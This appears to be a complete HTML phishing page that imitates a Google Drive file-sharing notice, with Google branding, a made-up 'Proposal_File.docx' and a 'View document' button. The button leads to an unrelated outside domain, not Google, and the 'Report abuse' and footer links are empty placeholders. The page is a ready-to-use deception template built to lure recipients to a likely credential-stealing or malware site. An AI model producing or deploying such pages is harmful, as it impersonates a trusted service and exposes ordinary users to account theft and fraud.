<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Drive - View Document</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="card">
            <!-- Pure CSS Google Drive Logo -->
            <div class="logo-container">
                <div class="drive-logo">
                    <div class="side green"></div>
                    <div class="side blue"></div>
                    <div class="side yellow"></div>
                </div>
                <div class="brand">Google Drive</div>
            </div>

            <h1>Shared Document</h1>
            <p>A file has been shared with you via Google Drive.</p>
            
            <div class="file-box">
                <!-- Pure CSS Doc Icon -->
                <div class="doc-icon">
                    <div class="lines"></div>
                </div>
                <div class="file-details">
                    <span class="file-name">Proposal_File.docx</span>
                    <span class="file-meta">Word Document • 1.2 MB</span>
                </div>
            </div>

            <div class="actions">
                <a href="https://founder.deciobo.solutions/0UQQj0iXO5rEMJgCnVeD@O/" class="btn-primary">View document</a>
            </div>

            <div class="footer">
                <p>Don't recognize this sender? <a href="#">Report abuse</a></p>
            </div>
        </div>
        
        <div class="bottom-nav">
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Help</a>
        </div>
    </div>
</body>
</html>
